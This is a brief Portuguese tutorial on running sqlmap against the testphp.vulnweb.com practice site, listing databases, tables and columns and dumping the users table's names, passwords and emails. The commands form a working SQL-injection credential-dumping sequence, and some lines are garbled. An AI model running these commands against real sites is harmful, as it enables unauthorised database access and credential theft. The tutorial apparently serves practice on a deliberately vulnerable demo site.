***
Após instalado O comando Git No Terminal 
E O Python Instale O Lazymux 
Execute A Instalação Do N-Map 

***

***

comando inicial 
cd sqlmap.py // Executara O SqlMap

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –-dbs / Fara O Pentest E Navegara Pelo Banco De Dados 

Aparecera Uma Mensagem De Y/N Para Proceguir 
neste momento ja detectou que o cat é vulnerável 
Como pode visualizar os banco de dados são exibidos:

[*] acuart

[*] information_schema

agora basta seguir com o seguinte comando 

sqlmap -u  http://testphp.vulnweb.com/listproducts.php?cat=1 –-dbs -D acuart –-tables

Agora que foram listados os banco de dados vamos extrair as tabelas do banco de dados acuart.

 Linux

sqlmap -u  http://testphp.vulnweb.com/listproducts.php?cat=1 –-dbs -D acuart –-tables

agora que temos a lista dos dados dispostos basta 
seguir com a seguinte etapa 

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –-dbs -D acuart -T users –-columns

agora basta que instalemos toda e qualquer informação do banco de dados através do dump 

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 –-dbs -D acuart -T users -C name,pass,uname,email –-dump

agora basta executar o login com as informações login : test senha : test e verificar as informações dispostas


